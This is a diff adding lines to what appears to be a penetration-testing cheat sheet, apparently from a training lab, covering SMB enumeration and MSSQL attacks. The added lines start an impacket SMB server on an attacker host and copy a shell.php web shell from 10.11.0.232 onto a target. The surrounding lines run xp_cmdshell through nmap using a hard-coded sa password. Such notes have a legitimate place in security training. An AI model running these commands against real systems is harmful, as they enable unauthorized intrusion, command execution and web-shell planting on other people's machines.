@@ -4,6 +4,11 @@ smbmap -H 10.11.1.136 -u null -p "" -R
 smbclient \\\\10.11.1.136\\'Bob Share' ""    
 smbclient \\\\\\\10.11.1.136\\\\'Bob Share' ""    
 
+#### SMB file transfer
+python /git/tools/impacket/examples/smbserver.py myshare /usr/share/priv/windows/
+net view \\10.11.0.232
+copy \\10.11.0.232\shell.php
+
 #### xp_cmdshell
 nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="net user" 10.11.1.31 
 
